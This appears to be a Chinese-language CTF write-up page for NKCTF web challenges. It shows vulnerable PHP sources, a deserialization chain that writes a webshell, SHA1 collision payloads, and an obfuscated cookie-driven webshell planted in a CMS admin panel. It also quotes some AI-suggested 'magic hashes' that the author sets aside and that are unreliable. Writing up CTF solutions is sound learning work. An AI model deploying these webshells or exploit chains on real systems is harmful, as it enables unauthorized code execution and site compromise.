@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Muscial Blog">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://muscial.github.io/img/bizhi.jpg">
+    <meta property="twitter:image" content="https://muscial.github.io/img/bizhi.jpg" />
+    
+
+    
+    <meta name="title" content="NKctf" />
+    <meta property="og:title" content="NKctf" />
+    <meta property="twitter:title" content="NKctf" />
+    
+
+    
+    <meta name="description" content="Muscial">
+    <meta property="og:description" content="Muscial" />
+    <meta property="twitter:description" content="Muscial" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Muscial">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>NKctf | Muscial的博客 | Zhaohuabing Blog</title>
+
+    <link rel="canonical" href="/post/test/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    <script src="/js/lazysizes.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Muscial Blog</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/tech">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/archive/">ARCHIVE</a></li>
+                    
+                        <li><a href="/notes/">NOTES</a></li>
+                    
+                        <li><a href="/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/bizhi.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/tag1" title="tag1">
+                            tag1
+                        </a>
+                        
+                        <a class="tag" href="/tags/tag2" title="tag2">
+                            tag2
+                        </a>
+                        
+                    </div>
+                    <h1>NKctf</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                     &#34;&#34;
+                             
+                            on 
+                            Monday, June 4, 2018
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h1 id="babyser">babyser</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
+</span></span><span style="display:flex;"><span>    error_reporting(<span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">class</span> Welcome{
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">public</span> $name;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">public</span> $arg <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;oww!man!!&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">public</span> <span style="color:#8be9fd;font-style:italic">function</span> __construct(){
+</span></span><span style="display:flex;"><span>            $this<span style="color:#ff79c6">-&gt;</span>name <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;ItS SO CREAZY&#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">public</span> <span style="color:#8be9fd;font-style:italic">function</span> __destruct(){
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span>($this<span style="color:#ff79c6">-&gt;</span>name <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;welcome_to_NKCTF&#39;</span>){
+</span></span><span style="display:flex;"><span>                echo $this<span style="color:#ff79c6">-&gt;</span>arg;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">function</span> waf($string){
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>(preg_match(<span style="color:#f1fa8c">&#39;/f|l|a|g|\\*|\\?/i&#39;</span>, $string)){
+</span></span><span style="display:flex;"><span>            die(<span style="color:#f1fa8c">&#34;you are bad&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">class</span> Happy{
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">public</span> $shell;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">public</span> $cmd;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">public</span> <span style="color:#8be9fd;font-style:italic">function</span> __invoke(){
+</span></span><span style="display:flex;"><span>            $shell <span style="color:#ff79c6">=</span> $this<span style="color:#ff79c6">-&gt;</span>shell;
+</span></span><span style="display:flex;"><span>            $cmd <span style="color:#ff79c6">=</span> $this<span style="color:#ff79c6">-&gt;</span>cmd;
+</span></span><span style="display:flex;"><span>            waf($cmd);
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">eval</span>($shell($cmd));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">class</span> Hell0{
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">public</span> $func;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">public</span> <span style="color:#8be9fd;font-style:italic">function</span> __toString(){
+</span></span><span style="display:flex;"><span>            $function <span style="color:#ff79c6">=</span> $this<span style="color:#ff79c6">-&gt;</span>func;
+</span></span><span style="display:flex;"><span>            $function();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span>(isset($_GET[<span style="color:#f1fa8c">&#39;p&#39;</span>])){
+</span></span><span style="display:flex;"><span>        unserialize($_GET[<span style="color:#f1fa8c">&#39;p&#39;</span>]);
+</span></span><span style="display:flex;"><span>    }<span style="color:#ff79c6">else</span>{
+</span></span><span style="display:flex;"><span>        highlight_file(__FILE__);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    $a <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Happy();
+</span></span><span style="display:flex;"><span>    $b <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Hell0();
+</span></span><span style="display:flex;"><span>    $c <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Welcome();
+</span></span><span style="display:flex;"><span>    $c <span style="color:#ff79c6">-&gt;</span> name <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;welcome_to_NKCTF&#39;</span>;
+</span></span><span style="display:flex;"><span>    $a <span style="color:#ff79c6">-&gt;</span> shell <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;system&#39;</span>;
+</span></span><span style="display:flex;"><span>    $a <span style="color:#ff79c6">-&gt;</span>cmd <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;echo \\&#39;</span>system($_POST[<span style="color:#bd93f9">1</span>]);\\<span style="color:#f1fa8c">&#39; &gt;&gt; 1.php&#39;</span>;<span style="color:#6272a4">//上传🐎
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    $c<span style="color:#ff79c6">-&gt;</span>arg<span style="color:#ff79c6">=</span>$b;#toString
+</span></span><span style="display:flex;"><span>    $b<span style="color:#ff79c6">-&gt;</span>fuc<span style="color:#ff79c6">=</span>$a;#invoke
+</span></span><span style="display:flex;"><span>    echo urlencode(serialize($c));
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><p>倒着看吧Happy 类里面有eval函数</p>
+<p>触发invoke 需要触发hello里面的tostring</p>
+<p>to string  需要welcome被当作字符串则需要触发destruct</p>
+<p>之前b卡住了因为construct new对象的时候把name改了；无法destruct；</p>
+<p>后面调用的时候改回来就好了</p>
+<p>echo 'system($_POST[1]);' &raquo; 1.php</p>
+<h2 id="baby_php">baby_php</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php 
+</span></span><span style="display:flex;"><span>    highlight_file(__FILE__);
+</span></span><span style="display:flex;"><span>    error_reporting(<span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span>($_GET[<span style="color:#f1fa8c">&#39;a&#39;</span>] <span style="color:#ff79c6">!=</span> $_GET[<span style="color:#f1fa8c">&#39;b&#39;</span>] <span style="color:#ff79c6">&amp;&amp;</span> md5($_GET[<span style="color:#f1fa8c">&#39;a&#39;</span>]) <span style="color:#ff79c6">==</span> md5($_GET[<span style="color:#f1fa8c">&#39;b&#39;</span>])){
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>((string)$_POST[<span style="color:#f1fa8c">&#39;c&#39;</span>] <span style="color:#ff79c6">!=</span> (string)$_POST[<span style="color:#f1fa8c">&#39;d&#39;</span>] <span style="color:#ff79c6">&amp;&amp;</span> sha1($_POST[<span style="color:#f1fa8c">&#39;c&#39;</span>]) <span style="color:#ff79c6">===</span> sha1($_POST[<span style="color:#f1fa8c">&#39;d&#39;</span>])){
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span>($_GET[<span style="color:#f1fa8c">&#39;e&#39;</span>] <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">114514</span> <span style="color:#ff79c6">&amp;&amp;</span> intval($_GET[<span style="color:#f1fa8c">&#39;e&#39;</span>]) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">114514</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span>(isset($_GET[<span style="color:#f1fa8c">&#39;NS_CTF.go&#39;</span>])){
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">if</span>(isset($_POST[<span style="color:#f1fa8c">&#39;cmd&#39;</span>])){
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>preg_match(<span style="color:#f1fa8c">&#39;/[0-9a-zA-Z]/i&#39;</span>, $_POST[<span style="color:#f1fa8c">&#39;cmd&#39;</span>])){
+</span></span><span style="display:flex;"><span>                            <span style="color:#8be9fd;font-style:italic">eval</span>($_POST[<span style="color:#f1fa8c">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span>                        }<span style="color:#ff79c6">else</span>{
+</span></span><span style="display:flex;"><span>                            die(<span style="color:#f1fa8c">&#39;error!!!!!!&#39;</span>);
+</span></span><span style="display:flex;"><span>                        }
+</span></span><span style="display:flex;"><span>                    }<span style="color:#ff79c6">else</span>{
+</span></span><span style="display:flex;"><span>                        die(<span style="color:#f1fa8c">&#39;error!!!!!&#39;</span>);
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                }<span style="color:#ff79c6">else</span>{
+</span></span><span style="display:flex;"><span>                    die(<span style="color:#f1fa8c">&#39;error!!!!&#39;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }<span style="color:#ff79c6">else</span>{
+</span></span><span style="display:flex;"><span>                die(<span style="color:#f1fa8c">&#39;error!!!&#39;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }<span style="color:#ff79c6">else</span>{
+</span></span><span style="display:flex;"><span>            die(<span style="color:#f1fa8c">&#39;error!!&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }<span style="color:#ff79c6">else</span>{
+</span></span><span style="display:flex;"><span>        die(<span style="color:#f1fa8c">&#39;error!&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span> error<span style="color:#ff79c6">!!</span>
+</span></span></code></pre></div><p>第一个是数组绕过</p>
+<p>第二个就有点意思了bing给我的是==号的绕过方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>如果你只是想测试一下这个问题，你可以使用一些已知的 <span style="color:#f1fa8c">&#34;魔术哈希&#34;</span><span style="color:#bd93f9">3</span>，即一些特殊的字符串，它们的哈希值恰好符合这种模式。例如，你可以使用以下两个字符串：
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c<span style="color:#ff79c6">:</span> QNKCDZO d<span style="color:#ff79c6">:</span> aaroZmOk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>它们的 sha1 哈希值分别是：
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span>e830400451993494058024219903391 d<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span>e087386482136013740957780965295
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>你可以看到，它们都以 “<span style="color:#bd93f9">0</span>e” 开头，并且后面都是数字，所以它们会被 PHP 认为是相等的。但是它们本身是不同的字符串，所以它们会满足 <span style="color:#ff79c6">if</span> 语句的条件。
+</span></span></code></pre></div><p>其实有印象是sha1的强碰撞</p>
+<p><a href="https://blog.csdn.net/weixin_52118430/article/details/123855542?ops_request_misc=%7B%22request%5Fid%22%3A%22167970001816800188539508%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167970001816800188539508&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-123855542-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&amp;utm_term=sha1%E5%BC%BA%E7%A2%B0%E6%92%9E">https://blog.csdn.net/weixin_52118430/article/details/123855542?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167970001816800188539508%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167970001816800188539508&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-123855542-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=sha1强碰撞</a> 绕过&amp;spm=1018.2226.3001.4187</p>
+<p>string会把数组转换成null</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>payload<span style="color:#ff79c6">:</span>array1<span style="color:#ff79c6">=%</span><span style="color:#bd93f9">4</span>d<span style="color:#ff79c6">%</span>c9<span style="color:#ff79c6">%</span><span style="color:#bd93f9">68</span><span style="color:#ff79c6">%</span>ff<span style="color:#ff79c6">%</span><span style="color:#bd93f9">0</span>e<span style="color:#ff79c6">%</span>e3<span style="color:#ff79c6">%</span><span style="color:#bd93f9">5</span>c<span style="color:#ff79c6">%</span><span style="color:#bd93f9">20</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">95</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">72</span><span style="color:#ff79c6">%</span>d4<span style="color:#ff79c6">%</span><span style="color:#bd93f9">77</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">7</span>b<span style="color:#ff79c6">%</span><span style="color:#bd93f9">72</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">15</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">87</span><span style="color:#ff79c6">%</span>d3<span style="color:#ff79c6">%</span><span style="color:#bd93f9">6</span>f<span style="color:#ff79c6">%</span>a7<span style="color:#ff79c6">%</span>b2<span style="color:#ff79c6">%</span><span style="color:#bd93f9">1</span>b<span style="color:#ff79c6">%</span>dc<span style="color:#ff79c6">%</span><span style="color:#bd93f9">56</span><span style="color:#ff79c6">%</span>b7<span style="color:#ff79c6">%</span><span style="color:#bd93f9">4</span>a<span style="color:#ff79c6">%</span><span style="color:#bd93f9">3</span>d<span style="color:#ff79c6">%</span>c0<span style="color:#ff79c6">%</span><span style="color:#bd93f9">78</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">3</span>e<span style="color:#ff79c6">%</span><span style="color:#bd93f9">7</span>b<span style="color:#ff79c6">%</span><span style="color:#bd93f9">95</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">18</span><span style="color:#ff79c6">%</span>af<span style="color:#ff79c6">%</span>bf<span style="color:#ff79c6">%</span>a2<span style="color:#ff79c6">%</span><span style="color:#bd93f9">00</span><span style="color:#ff79c6">%</span>a8<span style="color:#ff79c6">%</span><span style="color:#bd93f9">28</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">4</span>b<span style="color:#ff79c6">%</span>f3<span style="color:#ff79c6">%</span><span style="color:#bd93f9">6</span>e<span style="color:#ff79c6">%</span><span style="color:#bd93f9">8</span>e<span style="color:#ff79c6">%</span><span style="color:#bd93f9">4</span>b<span style="color:#ff79c6">%</span><span style="color:#bd93f9">55</span><span style="color:#ff79c6">%</span>b3<span style="color:#ff79c6">%</span><span style="color:#bd93f9">5</span>f<span style="color:#ff79c6">%</span><span style="color:#bd93f9">42</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">75</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">93</span><span style="color:#ff79c6">%</span>d8<span style="color:#ff79c6">%</span><span style="color:#bd93f9">49</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">67</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">6</span>d<span style="color:#ff79c6">%</span>a0<span style="color:#ff79c6">%</span>d1<span style="color:#ff79c6">%</span><span style="color:#bd93f9">55</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">5</span>d<span style="color:#ff79c6">%</span><span style="color:#bd93f9">83</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">60</span><span style="color:#ff79c6">%</span>fb<span style="color:#ff79c6">%</span><span style="color:#bd93f9">5</span>f<span style="color:#ff79c6">%</span><span style="color:#bd93f9">07</span><span style="color:#ff79c6">%</span>fe<span style="color:#ff79c6">%</span>a2
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&amp;</span>array2<span style="color:#ff79c6">=%</span><span style="color:#bd93f9">4</span>d<span style="color:#ff79c6">%</span>c9<span style="color:#ff79c6">%</span><span style="color:#bd93f9">68</span><span style="color:#ff79c6">%</span>ff<span style="color:#ff79c6">%</span><span style="color:#bd93f9">0</span>e<span style="color:#ff79c6">%</span>e3<span style="color:#ff79c6">%</span><span style="color:#bd93f9">5</span>c<span style="color:#ff79c6">%</span><span style="color:#bd93f9">20</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">95</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">72</span><span style="color:#ff79c6">%</span>d4<span style="color:#ff79c6">%</span><span style="color:#bd93f9">77</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">7</span>b<span style="color:#ff79c6">%</span><span style="color:#bd93f9">72</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">15</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">87</span><span style="color:#ff79c6">%</span>d3<span style="color:#ff79c6">%</span><span style="color:#bd93f9">6</span>f<span style="color:#ff79c6">%</span>a7<span style="color:#ff79c6">%</span>b2<span style="color:#ff79c6">%</span><span style="color:#bd93f9">1</span>b<span style="color:#ff79c6">%</span>dc<span style="color:#ff79c6">%</span><span style="color:#bd93f9">56</span><span style="color:#ff79c6">%</span>b7<span style="color:#ff79c6">%</span><span style="color:#bd93f9">4</span>a<span style="color:#ff79c6">%</span><span style="color:#bd93f9">3</span>d<span style="color:#ff79c6">%</span>c0<span style="color:#ff79c6">%</span><span style="color:#bd93f9">78</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">3</span>e<span style="color:#ff79c6">%</span><span style="color:#bd93f9">7</span>b<span style="color:#ff79c6">%</span><span style="color:#bd93f9">95</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">18</span><span style="color:#ff79c6">%</span>af<span style="color:#ff79c6">%</span>bf<span style="color:#ff79c6">%</span>a2<span style="color:#ff79c6">%</span><span style="color:#bd93f9">02</span><span style="color:#ff79c6">%</span>a8<span style="color:#ff79c6">%</span><span style="color:#bd93f9">28</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">4</span>b<span style="color:#ff79c6">%</span>f3<span style="color:#ff79c6">%</span><span style="color:#bd93f9">6</span>e<span style="color:#ff79c6">%</span><span style="color:#bd93f9">8</span>e<span style="color:#ff79c6">%</span><span style="color:#bd93f9">4</span>b<span style="color:#ff79c6">%</span><span style="color:#bd93f9">55</span><span style="color:#ff79c6">%</span>b3<span style="color:#ff79c6">%</span><span style="color:#bd93f9">5</span>f<span style="color:#ff79c6">%</span><span style="color:#bd93f9">42</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">75</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">93</span><span style="color:#ff79c6">%</span>d8<span style="color:#ff79c6">%</span><span style="color:#bd93f9">49</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">67</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">6</span>d<span style="color:#ff79c6">%</span>a0<span style="color:#ff79c6">%</span>d1<span style="color:#ff79c6">%</span>d5<span style="color:#ff79c6">%</span><span style="color:#bd93f9">5</span>d<span style="color:#ff79c6">%</span><span style="color:#bd93f9">83</span><span style="color:#ff79c6">%</span><span style="color:#bd93f9">60</span><span style="color:#ff79c6">%</span>fb<span style="color:#ff79c6">%</span><span style="color:#bd93f9">5</span>f<span style="color:#ff79c6">%</span><span style="color:#bd93f9">07</span><span style="color:#ff79c6">%</span>fe<span style="color:#ff79c6">%</span>a2
+</span></span></code></pre></div><p>intval绕过有很多</p>
+<p>无字母最简单就是取反</p>
+<h2 id="hardphp">hardphp</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// not only ++
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>error_reporting(<span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>highlight_file(__FILE__);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (isset($_POST[<span style="color:#f1fa8c">&#39;NKCTF&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $NK <span style="color:#ff79c6">=</span> $_POST[<span style="color:#f1fa8c">&#39;NKCTF&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (is_string($NK)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>preg_match(<span style="color:#f1fa8c">&#34;/[a-zA-Z0-9@#%^&amp;*:{}\\-&lt;\\?&gt;\\&#34;</span><span style="color:#ff79c6">|</span><span style="color:#f1fa8c">`~\\\\\\\\]/&#34;,$NK) &amp;&amp; strlen($NK) &lt; 105){
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            eval($NK);
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        }else{
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            echo(&#34;hacker!!!&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    }else{
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        phpinfo();
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">}
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">?&gt;
+</span></span></span></code></pre></div><p>我直接上网搜这个正则表达式，原题出来了</p>
+<p>本置上是限制长度的自增</p>
+<p>先通过fuzz看还剩下什么字符</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> ($i<span style="color:#ff79c6">=</span><span style="color:#bd93f9">32</span>;$i&lt;<span style="color:#ff79c6">127</span>;$<span style="color:#50fa7b">i</span>++){
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">if</span> (!<span style="color:#50fa7b">preg_match</span>(&#34;/[<span style="color:#50fa7b">a</span>-<span style="color:#50fa7b">zA</span>-<span style="color:#50fa7b">Z0</span>-<span style="color:#50fa7b">9</span>@#%^&amp;*:{}\\-&lt;\\?&gt;\\<span style="color:#f1fa8c">&#34;|`~\\\\\\\\]/&#34;</span>,chr($i))){
+</span></span><span style="display:flex;"><span>        echo chr($i);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//!$&#39;()+,./;=[]_
+</span></span></span></code></pre></div><p>听o2说要看php里面的disabledfunction</p>
+<p>byd我就是乍system不行</p>
+<p>shell_exec可以</p>
+<h1 id="禅道pms">禅道pms</h1>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&amp;mid=2247491671&amp;idx=1&amp;sn=850b394fac64fe3f4cdd8c767252e943">禅道系统权限绕过与命令执行漏洞</a></p>
+<p>发3个包</p>
+<h1 id="ezsy_cms">ezsy_cms</h1>
+<p>byd做到时候环境开不起，纯白界面（ 最爱的隔空复现环节</p>
+<p>admin admin 进后台</p>
+<p>直接加的免杀shell</p>
+<p>cookie传参对应webshell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
+</span></span><span style="display:flex;"><span>$p<span style="color:#ff79c6">=</span>$_COOKIE;(count($p)<span style="color:#ff79c6">==</span><span style="color:#bd93f9">23</span><span style="color:#ff79c6">&amp;&amp;</span>in_array(gettype($p).count($p),$p))<span style="color:#ff79c6">?</span>(($p[<span style="color:#bd93f9">59</span>]<span style="color:#ff79c6">=</span>$p[<span style="color:#bd93f9">59</span>].$p[<span style="color:#bd93f9">72</span>])<span style="color:#ff79c6">&amp;&amp;</span>($p[<span style="color:#bd93f9">91</span>]<span style="color:#ff79c6">=</span>$p[<span style="color:#bd93f9">59</span>]($p[<span style="color:#bd93f9">91</span>]))<span style="color:#ff79c6">&amp;&amp;</span>($p<span style="color:#ff79c6">=</span>$p[<span style="color:#bd93f9">91</span>]($p[<span style="color:#bd93f9">90</span>],$p[<span style="color:#bd93f9">59</span>]($p[<span style="color:#bd93f9">31</span>])))<span style="color:#ff79c6">&amp;&amp;</span>$p())<span style="color:#ff79c6">:</span>$p;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><h1 id="social-engening">Social Engening</h1>
+<h1 id="bridge">bridge</h1>
+<p>NKCTF{海南省海口市龙华区绿地外滩公馆}</p>
+<p>NKCTF{海南省海口市龙华区绿地世纪公园}</p>
